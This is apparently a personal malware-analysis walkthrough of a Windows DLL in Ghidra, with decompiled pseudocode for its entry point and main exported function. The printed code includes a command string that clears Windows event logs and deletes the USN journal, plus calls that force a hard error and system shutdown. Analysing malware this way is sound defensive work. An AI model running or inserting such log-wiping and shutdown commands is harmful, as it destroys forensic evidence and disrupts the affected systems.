Analysis warning:

PDB> Incomplete PDB information (GUID/Signature and/or age) associated with this program.
Either the program is not a PE, or it was not compiled with debug information.
Windows x86 PE RTTI Analyzer> Couldn't find type info structure.

This is probably fine since it seems illogical to include debug information with malware.

======

No typical main function found. Instead going to entry point function.

'entry' seems to resemble the DllMain entry point but is missing the 3rd parameter:

> undefined4 entry(HMODULE param_1,int param_2){
  if (param_2 == 1) {
    DAT_1001f120 = param_1;
    DisableThreadLibraryCalls(param_1);
  }
  return 1;
}

MSDN lists the signature as

> BOOL WINAPI DllMain(
  _In_ HINSTANCE hinstDLL,
  _In_ DWORD     fdwReason,
  _In_ LPVOID    lpvReserved
);

https://docs.microsoft.com/en-us/windows/win32/dlls/dllmain

Documentation for the 3rd argument seems to suggest that it can be NULL for dynamic loads however.
The body of the function checks for the second argument to be 1, from MSDN this is the constant for DLL_PROCESS_ATTACH meaning the DLL is being loaded. 
The first parameter is suggested to be a HMODULE and is a handle to the DLL module. By definition HMODULE and HINSTANCE represent the same data type on Windows version that are more than 16-bits as can be found in the Data Types MSDN documentation https://docs.microsoft.com/en-us/windows/win32/winprog/windows-data-types.

Given that this is the 'entry' point and we have no more information this being DllMain seems reasonable so we're going to input that into Ghidra.

Assuming that the provided fdwReason is DLL_RPOCESS_ATTACH then it becomes clear that we store a handle to the DLL module and invoke DisableThreadLibraryCalls. The latter from MSDN https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-disablethreadlibrarycalls seems to just disable DLL_THREAD_ATTACH and DLL_THREAD_DETACH notifications though I have no idea what this means. We'll rename the DLL handle field however.

After this the entry point returns 1 (true) for success.

=====

Given that this marks the end of the function we need something more. We know that were are loaded as a DLL. Moreover in Ghidra we can see that the entire DLL only exports two functions. One of them being the entry point we just looked at. A natural next point of investigation is the other exported function, labelled Ordinal_1 by Ghidra.

=====

The Ordinal_1 function contains a lot of logic and luckily also a fair few WINAPI calls which we should be able to use to deduce the type and purpose of some of the logic. Furthermore, at the end of the function is an infinite while loop that looks interesting. It seems highly likely that this function is the root function of the malware. The signature of the Ordinal_1 function is as follows.

> void Ordinal_1(uint param_1,HANDLE param_2,LPCWSTR param_3,HANDLE param_4)

Using Ghidra we first check if there are references to this function. Save for external calls, such a call does exist. From a function called 'FUN_100094a5' this function also seems to reference our earlier DLL handle and is probably used to load or reload the exported function. For now we'll just remember it.

In order to make it easier to reference stuff I'll also paste down below the raw decompilation result for the Ordinal_1 function.

void Ordinal_1(uint param_1,HANDLE param_2,LPCWSTR param_3,HANDLE param_4){
  uint uVar1;
  BOOL BVar2;
  DWORD dwFlags;
  HANDLE hHeap;
  int iVar3;
  HMODULE hModule;
  FARPROC pFVar4;
  HANDLE *ppvVar5;
  SIZE_T dwBytes;
  int *lpMem;
  WCHAR local_4a1c [8192];
  WCHAR local_a1c [1023];
  undefined2 local_21e;
  HANDLE local_21c [64];
  _OSVERSIONINFOW local_11c;

  int *local_8;
  
                    /* 0x7deb  1   */
  local_8 = (int *)0x10007df8;
  FUN_10007cc0();
  if (param_4 != (HANDLE)0xffffffff) {
    FUN_10009590(param_1,param_2,param_3);
  }
  Ordinal_115(0x202,&DAT_1001f768);
  DAT_1001f140 = FUN_10007091(0x24,(ULONG_PTR)FUN_10006eda,(PRTL_CRITICAL_SECTION_DEBUG)0x0,0xffff);
  DAT_1001f108 = FUN_10007091(8,(ULONG_PTR)FUN_10006c74,(PRTL_CRITICAL_SECTION_DEBUG)FUN_10006caa,
                              0xff);
  DAT_1001f110 = (LPCRITICAL_SECTION)0x0;
  InitializeCriticalSection((LPCRITICAL_SECTION)&DAT_1001f124);
  FUN_10006a2b(param_3);
  if ((DAT_1001f144 & 2) != 0) {
    FUN_1000835e();
    FUN_10008d5a();
  }
  FUN_100084df();
  CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_10007c10,(LPVOID)0x0,0,(LPDWORD)0x0);
  if (((DAT_1001f144 & 2) != 0) && ((DAT_1001f104 & 1) != 0)) {
    FUN_10007545();
  }
  FUN_100070fa();
  if ((DAT_1001f104 & 2) != 0) {
    FUN_10008999(DAT_1001f144 & 6);
  }
  if ((DAT_1001f144 & 4) != 0) {
    DAT_1001f110 = FUN_10007091(4,(ULONG_PTR)FUN_10007ca5,(PRTL_CRITICAL_SECTION_DEBUG)0x0,0xff);
    uVar1 = FUN_1000875a((int)local_21c);
    if (uVar1 != 0) {
      ppvVar5 = local_21c;
      param_1 = uVar1;
      do {
        local_8 = (int *)*ppvVar5;
        param_3 = (LPCWSTR)0x0;
        param_2 = (HANDLE)0x0;
        param_3 = (LPCWSTR)CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_10009f8e,(LPVOID)0x0,4,
                                        (LPDWORD)0x0);
        if (param_3 == (LPCWSTR)0x0) {
          param_2 = (HANDLE)0x57;
        }
        else {
          BVar2 = SetThreadToken(&param_3,local_8);
          if (BVar2 == 0) {
            param_2 = (HANDLE)GetLastError();
          }
          else {
            dwFlags = ResumeThread(param_3);
            if (dwFlags != 0xffffffff) goto LAB_10007f70;
          }
          CloseHandle(param_3);
        }
LAB_10007f70:
        SetLastError((DWORD)param_2);
        param_2 = *ppvVar5;
        param_3 = (LPCWSTR)0x0;
        param_4 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_10007d58,&param_3,4,(LPDWORD)0x0);
        if (param_4 != (HANDLE)0x0) {
          BVar2 = SetThreadToken(&param_4,param_2);
          if (BVar2 != 0) {
            dwFlags = ResumeThread(param_4);
            if (dwFlags == 0xffffffff) {
              GetLastError();
            }
            else {
              WaitForSingleObject(param_4,0xffffffff);
            }
          }
          CloseHandle(param_4);
        }
        if (param_3 != (LPCWSTR)0x0) {
          FUN_10007298(DAT_1001f110,ppvVar5,0);
        }
        ppvVar5 = ppvVar5 + 1;
        param_1 = param_1 - 1;
      } while (param_1 != 0);
    }
  }
  FUN_100070fa();
  CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_1000a0fe,(LPVOID)0x0,0,(LPDWORD)0x0);
  param_4 = (HANDLE)0x0;
  param_1 = 0;
  param_3 = (LPCWSTR)0x0;
  param_2 = (HANDLE)0x0;
  FUN_10008282((uint *)&param_4,&param_1,(uint *)&param_3,(uint *)&param_2);
  dwBytes = 4;
  dwFlags = 8;
  hHeap = GetProcessHeap();
  local_8 = (int *)HeapAlloc(hHeap,dwFlags,dwBytes);
  if (local_8 != (int *)0x0) {
    *local_8 = (int)param_3 * 60000;
    hHeap = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_1000a274,local_8,0,(LPDWORD)0x0);
    if (hHeap == (HANDLE)0x0) {
      dwFlags = 0;
      lpMem = local_8;
      hHeap = GetProcessHeap();
      HeapFree(hHeap,dwFlags,lpMem);
    }
  }
  Sleep((int)param_4 * 60000);
  if ((DAT_1001f104 & 0x10) != 0) {
    FUN_10001eef();
  }
  Sleep((int)param_2 * 60000);
  if ((DAT_1001f144 & 2) != 0) goto LAB_1000811b;
  memset(&local_11c,0,0x114);
  local_11c.dwOSVersionInfoSize = 0x114;
  BVar2 = GetVersionExW((LPOSVERSIONINFOW)&local_11c);
  if (BVar2 == 0) goto LAB_1000811b;
  if ((local_11c.dwMajorVersion != 5) ||
     ((local_11c.dwMinorVersion != 1 && (local_11c.dwMinorVersion != 2)))) {
    if (local_11c.dwMajorVersion != 6) goto LAB_1000811b;
    if ((local_11c.dwMinorVersion != 0) && (local_11c.dwMinorVersion != 1)) goto LAB_1000811b;
  }
  FUN_10006bb0(local_4a1c);
  iVar3 = FUN_10007d6f(local_4a1c);
  if (iVar3 == 0) goto LAB_1000811b;
  do {
    ExitProcess(0);
LAB_1000811b:
    Sleep(param_1 * 60000);
    wsprintfW(local_a1c,
                            
              L"wevtutil cl Setup & wevtutil cl System & wevtutil cl Security & wevtutil clApplication & fsutil usn deletejournal /D %c:"
              ,(uint)DAT_1001f148);
    local_21e = 0;
    FUN_100083bd(3);
    if ((DAT_1001f144 & 1) != 0) {
      hModule = GetModuleHandleA("ntdll.dll");
      if ((hModule != (HMODULE)0x0) &&
         (pFVar4 = GetProcAddress(hModule,"NtRaiseHardError"), pFVar4 != (FARPROC)0x0)) {
        (*pFVar4)(0xc0000350,0,0,0,6,&param_3);
      }
      BVar2 = InitiateSystemShutdownExW((LPWSTR)0x0,(LPWSTR)0x0,0,1,1,0x80000000);
      if (BVar2 == 0) {
        ExitWindowsEx(6,0);
      }
    }
  } while( true );
}

------

We skin the variable declarations for now and instead look at FUN_10007cc0. 

void FUN_10007cc0(void)

{
  BOOL BVar1;
  DWORD DVar2;
  uint uVar3;
  
  if (_DAT_1001f114 == 0) {
    DAT_1001f118 = GetTickCount();
    BVar1 = FUN_100081ba(L"SeShutdownPrivilege");
    uVar3 = (uint)(BVar1 != 0);
    BVar1 = FUN_100081ba(L"SeDebugPrivilege");
    if (BVar1 != 0) {
      uVar3 = uVar3 | 2;
    }
    BVar1 = FUN_100081ba(L"SeTcbPrivilege");
    if (BVar1 != 0) {
      uVar3 = uVar3 | 4;
    }
    DAT_1001f144 = uVar3;
    _DAT_1001f104 = FUN_10008677();
    DVar2 = GetModuleFileNameW(DLL_handle,&DAT_1001f148,0x30c);
    if (DVar2 != 0) {
      FUN_10008acf();
      return;
    }
  }
  return;
}

This function checks some datavalue `_DAT_1001f114` against being 0. After that it calls GetTickCount() which from MSDN https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-gettickcount turns out to return the number of millis since the system was started. Meaning we can rename the data variable that stores it.













One of the first things to note in the function is that it checks the 4th argument against 0xffffffff. We also know that it is cast to a HANDLE. Further more we know that depending on the compiler a HANDLE is 32 or 64 bits and Ghidra tells us as general information that the application is using 32 bits Address Size. Meaning it is a DWORD and corresponds to -1. Some more MSDN searching reveals that this is the constant for INVALID_HANDLE_VALUE.






memory:
- FUN_100094a5 - only internal reference to Ordinal_1






















